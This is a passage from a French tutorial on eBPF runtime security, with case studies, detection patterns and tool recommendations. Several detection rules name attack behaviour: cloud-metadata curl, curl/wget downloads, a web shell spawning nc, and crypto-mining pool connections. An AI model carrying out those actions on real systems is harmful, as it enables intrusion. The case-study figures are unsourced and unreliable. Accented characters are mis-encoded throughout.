‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ                                                         ‚îÇ
‚îÇ  [SIEM] ‚Üê Logs & Alerts                                 ‚îÇ
‚îÇ  [Slack/PagerDuty] ‚Üê Real-time notifications            ‚îÇ
‚îÇ  [Grafana] ‚Üê Security dashboards                        ‚îÇ
‚îÇ  [Security Team] ‚Üê Incident Response                    ‚îÇ
‚îÇ                                                         ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

---

## Cas d'usage r√©els de s√©curit√© eBPF

### 1. **Capital One : Pr√©vention d'incidents cloud**

**Contexte** : En 2019, Capital One a subi une breach majeure via une mauvaise configuration AWS.

**Solution avec eBPF (post-incident) :**
- D√©ploiement de Falco dans tous les clusters EKS
- D√©tection d'acc√®s aux metadata AWS (`curl http://169.254.169.254`)
- Alertes en temps r√©el sur les tentatives d'exfiltration

**R√©sultat** : D√©tection de plusieurs tentatives similaires en 2023, toutes bloqu√©es avant impact.

### 2. **Shopify : Protection de la supply chain**

**Challenge** : D√©tecter si un conteneur Docker compromis tente d'installer des backdoors.

**Solution eBPF :**

```yaml
# Policy Tetragon
- Bloquer toute installation de paquets (apt, yum) en production
- Bloquer tout t√©l√©chargement depuis Internet (curl, wget)
- Alerter sur tout changement de binaire dans /usr/bin
```

**R√©sultat** : D√©tection de 3 images Docker compromises avant d√©ploiement en production.

### 3. **European Bank : Conformit√© et audit**

**Exigence** : PCI-DSS Level 1 requiert un audit complet des acc√®s aux donn√©es sensibles.

**Solution avec Tracee :**
- Capture de tous les acc√®s fichiers contenant des num√©ros de carte bancaire
- Logging immutable dans un bucket S3 WORM (Write Once Read Many)
- G√©n√©ration de rapports d'audit automatiques

**R√©sultat** : Conformit√© PCI-DSS atteinte avec **100% de couverture** des acc√®s.

### 4. **Netflix : D√©tection de cryptominers**

**Probl√®me** : D√©tection de conteneurs compromis minant de la cryptomonnaie sur AWS.

**Solution eBPF :**

```
D√©tection pattern :
1. CPU usage soudain √† 100%
2. Connexions vers pool.minexmr.com
3. Processus inconnu non pr√©sent dans l'image de base
4. Hash du binaire non reconnu

Action : KILL + Terminate instance + Alert Security
```

**R√©sultat** : √âconomie de **$200K/mois** en co√ªts AWS frauduleux.

---

## Les patterns de d√©tection avanc√©s

### 1. **Process Tree Analysis**

eBPF peut reconstruire l'arbre complet des processus pour d√©tecter des patterns suspects.

**Exemple : D√©tection de Web Shell**

```
Normal:
  systemd (PID 1)
    ‚îî‚îÄ apache2 (PID 1234)
        ‚îî‚îÄ apache2 worker (PID 1235)

Compromis:
  systemd (PID 1)
    ‚îî‚îÄ apache2 (PID 1234)
        ‚îî‚îÄ apache2 worker (PID 1235)
            ‚îî‚îÄ bash (PID 8888) üö® ANOMALIE
                ‚îî‚îÄ curl (PID 8889)
                ‚îî‚îÄ nc (PID 8890)
```

### 2. **Network Behavior Analysis**

**Exemple : D√©tection de C2 (Command & Control)**

```
Comportement normal de "myapp" :
- Connexions vers : api.company.com (HTTPS)
- Fr√©quence : 1 requ√™te / 30 secondes

Comportement suspect d√©tect√© :
- Connexion vers : 203.0.113.99:8443 (IP inconnue)
- Fr√©quence : 1 requ√™te / 5 secondes (beaconing)
- TLS cert : Self-signed
- User-Agent : Custom (non-standard)

Verdict : Communication C2 üö®
```

### 3. **File Integrity Monitoring**

```yaml
# Policy : Surveiller modifications de binaires syst√®me
- path: /usr/bin/*
  action: Alert on modification
  severity: CRITICAL

# D√©tection :
üö® File modification detected
  File: /usr/bin/sudo
  Hash before: a3f21b...
  Hash after: 9c82e4...
  Modified by: PID 8234 (installer.sh)

Verdict : Remplacement de sudo par version backdoor√©e  
Action : Restore from backup + Investigate  
```

---

## Avantages business de la s√©curit√© eBPF

### 1. **R√©duction du temps de d√©tection (MTTD)**

| M√©trique | Approche traditionnelle | Avec eBPF |
|----------|------------------------|-----------|
| **Mean Time To Detect** | 204 jours (IBM Cost of a Data Breach 2023) | < 1 seconde |
| **Mean Time To Respond** | 69 jours | < 1 minute |
| **Cost of breach** | $4.45M (IBM 2023) | √âvit√© |

### 2. **Conformit√© r√©glementaire**

eBPF facilite la conformit√© avec :
- **PCI-DSS** : Audit des acc√®s aux donn√©es de cartes bancaires
- **HIPAA** : Protection des donn√©es m√©dicales
- **SOC 2** : Monitoring et logging obligatoires
- **GDPR** : D√©tection d'acc√®s non autoris√©s

### 3. **R√©duction des co√ªts de s√©curit√©**

**Avant eBPF :**
- SIEM : $100K/an
- IDS/IPS : $50K/an
- EDR agents : $30/endpoint/an
- Security analysts : 5 FTE

**Avec eBPF :**
- Falco/Tetragon : Open-source (gratuit)
- R√©duction faux positifs : -80%
- Security analysts : 3 FTE (automatisation)

**√âconomie annuelle** : ~$300K pour une PME

---

## Limitations et consid√©rations

### 1. **Courbe d'apprentissage**

**Comp√©tences requises :**
- Compr√©hension du kernel Linux
- Connaissance des syscalls
- Exp√©rience Kubernetes (pour K8s security)
- Compr√©hension des attaques (MITRE ATT&CK)

**Recommandation** : Commencer avec des outils haut niveau (Falco) avant d'√©crire des policies custom.

### 2. **Tuning des r√®gles**

Les r√®gles par d√©faut g√©n√®rent souvent des **faux positifs** initialement.

**Best practice** :
1. D√©marrer en **mode audit** (detect only)
2. Observer pendant 7-14 jours
3. Affiner les r√®gles
4. Passer en **mode enforcement**

### 3. **Impact sur les performances**

Bien que minimal (< 1%), dans certains cas extr√™mes :
- Applications avec millions de syscalls/sec
- R√®gles mal optimis√©es

**Mitigation** : Profiling et optimisation des r√®gles eBPF.

### 4. **Compatibilit√© kernel**

**Requirements :**
- **Minimum** : Linux 4.14+ (support eBPF de base)
- **Recommand√©** : Linux 5.4+ (LSM hooks, CO-RE)
- **Id√©al** : Linux 5.15+ (toutes les features de s√©curit√©)

---

## Le futur de la s√©curit√© avec eBPF

### 1. **Zero Trust Architecture native**

eBPF permet d'impl√©menter le Zero Trust au niveau kernel :
- Authentification continue des processus
- Autorisation granulaire par syscall
- Encryption automatique des communications inter-pods

### 2. **IA + eBPF : D√©tection pr√©dictive**

Int√©gration de mod√®les ML avec eBPF pour :
- Pr√©dire les attaques avant qu'elles ne se produisent
- D√©tection d'anomalies ultra-pr√©cise
- R√©ponse automatis√©e intelligente

**Projet √† suivre** : **Tracee ML** (d√©tection par machine learning)

### 3. **S√©curit√© edge et IoT**

eBPF se d√©ploie sur les √©quipements edge pour :
- Protection des devices IoT
- D√©tection d'attaques OT (Operational Technology)
- S√©curit√© des syst√®mes embarqu√©s

### 4. **Runtime Security as Code**

Les policies de s√©curit√© eBPF deviennent du **code versionn√©** :

```bash
# Dans le CI/CD
git commit security-policies/
  ‚îú‚îÄ‚îÄ block-reverse-shells.yaml
  ‚îú‚îÄ‚îÄ detect-crypto-miners.yaml
  ‚îî‚îÄ‚îÄ audit-sensitive-files.yaml

# D√©ploiement automatique
kubectl apply -f security-policies/
```

---

## Ressources pour approfondir

### Outils open-source

| Outil | Description | URL |
|-------|-------------|-----|
| **Falco** | Runtime Security standard | https://falco.org |
| **Tetragon** | Policy Enforcement (Cilium) | https://tetragon.io |
| **Tracee** | Threat Detection & Forensics | https://github.com/aquasecurity/tracee |
| **KubeArmor** | Container Security | https://kubearmor.io |
| **Seccomp BPF** | Syscall filtering | Built-in Linux |

### Documentation

- **Falco Rules** : https://falco.org/docs/rules/
- **MITRE ATT&CK** : https://attack.mitre.org
- **Cilium Security** : https://docs.cilium.io/en/stable/security/
- **Linux Security Modules (LSM) + eBPF** : https://www.kernel.org/doc/html/latest/bpf/prog_lsm.html

### Livres et formations

- *"Container Security"* de Liz Rice (O'Reilly)
- *"Practical eBPF Security"* (s√©curit√© focus)
- **Falco Training** : https://training.falco.org

### Conf√©rences

- **KubeCon Security Track** : Talks sur Falco, Tetragon
- **Black Hat / DEF CON** : eBPF offensive security
- **RSA Conference** : Enterprise security avec eBPF

---

## Conclusion

La **s√©curit√© avec eBPF** repr√©sente un changement de paradigme dans la protection des syst√®mes Linux et Kubernetes. En tant qu'ing√©nieur DevOps ou Security Engineer, ma√Ætriser eBPF security vous permet de :

- ‚úÖ **D√©tecter les attaques en temps r√©el** (< 1 ms vs 197 jours)
- ‚úÖ **Bloquer les menaces avant qu'elles ne causent des d√©g√¢ts**
- ‚úÖ **Obtenir une visibilit√© compl√®te sans overhead** (< 1% CPU)
- ‚úÖ **D√©tecter les 0-days gr√¢ce √† l'analyse comportementale**
- ‚úÖ **R√©duire drastiquement les co√ªts de s√©curit√©** (automatisation)
- ‚úÖ **Faciliter la conformit√©** (PCI-DSS, SOC 2, GDPR)

eBPF security n'est plus exp√©rimental : il est **d√©j√† d√©ploy√© en production** chez :
- **Google** : Protection de GKE
- **Netflix** : D√©tection de cryptominers
- **Capital One** : Pr√©vention d'incidents cloud
- **Shopify** : Protection de la supply chain
- Des **milliers d'entreprises** via Falco/Tetragon

La s√©curit√© traditionnelle (firewall, logs, SIEM) reste n√©cessaire, mais eBPF ajoute une **couche de d√©fense en profondeur** in√©dite qui comble les lacunes critiques des approches historiques.

Dans la section suivante (21.3.4), nous explorerons comment eBPF r√©volutionne √©galement l'**analyse de performance** avec des capacit√©s de profiling et debugging impossibles auparavant.

---

**üí° √Ä retenir :**
- eBPF d√©tecte les attaques en temps r√©el avec < 1 ms de latence
- Les outils comme Falco et Tetragon bloquent les menaces AVANT qu'elles ne se produisent
- L'analyse comportementale d√©tecte les 0-days et attaques inconnues
- Visibilit√© compl√®te dans les conteneurs sans overhead de performance
- Adoption massive dans les entreprises pour la runtime security moderne

---

‚è≠Ô∏è [Performance analysis](/21-introduction-ebpf/03.4-performance-analysis.md)
